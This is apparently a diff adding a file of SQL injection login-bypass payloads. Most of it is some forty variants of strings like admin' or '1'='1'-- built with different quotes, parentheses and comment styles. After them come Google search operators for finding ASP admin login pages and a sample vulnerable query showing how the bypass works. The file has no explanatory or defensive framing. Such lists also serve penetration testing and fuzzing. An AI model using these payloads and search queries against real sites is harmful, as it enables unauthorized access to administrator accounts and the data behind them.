@@ -1,0 +1,66 @@
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+
+
+
+
+"inurl:admin.asp"
+"inurl:login/admin.asp"
+"inurl:admin/login.asp"
+"inurl:adminlogin.asp"
+"inurl:adminhome.asp" site:”.com”
+"inurl:admin_login.asp"
+"inurl:administratorlogin.asp"
+"inurl:login/administrator.asp"
+"inurl:administrator_login.asp"
+
+‘or’1’=‘1
+
+
+select username,password from admin where username=‘ ‘or’1’=‘1 ’ && password=‘‘or’1’=‘1’
+
+
+
+
